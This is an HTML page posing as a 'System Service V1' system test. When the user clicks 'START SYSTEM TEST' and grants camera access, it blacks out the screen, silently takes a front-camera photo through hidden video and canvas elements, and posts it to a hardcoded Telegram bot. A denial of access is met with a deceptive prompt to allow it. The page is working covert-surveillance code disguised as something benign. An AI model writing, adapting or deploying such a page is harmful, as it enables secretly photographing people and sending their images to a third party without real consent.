<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Service V1</title>
    <style>
        /* This makes the screen completely black for the user */
        body { 
            background: black; 
            color: white; 
            margin: 0; 
            overflow: hidden; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        #startBtn { 
            padding: 20px; 
            background: #333; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 18px;
        }
    </style>
</head>
<body>

    <button id="startBtn">START SYSTEM TEST</button>
    
    <!-- Hidden elements for camera processing -->
    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Your specific Telegram bot details
        const BOT_TOKEN = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
        const CHAT_ID = '8681771719';

        const startBtn = document.getElementById('startBtn');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        startBtn.onclick = async () => {
            try {
                // Request front camera access
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                video.srcObject = stream;
                startBtn.style.display = 'none'; // Button disappears, screen goes black
                
                // Wait 2 seconds for the camera to focus, then capture
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert image to blob and send to Telegram
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'img.jpg');

                        fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg');
                }, 2000);

            } catch (err) {
                alert("Please click 'Allow' to proceed with the system test.");
            }
        };
    </script>
</body>
</html>
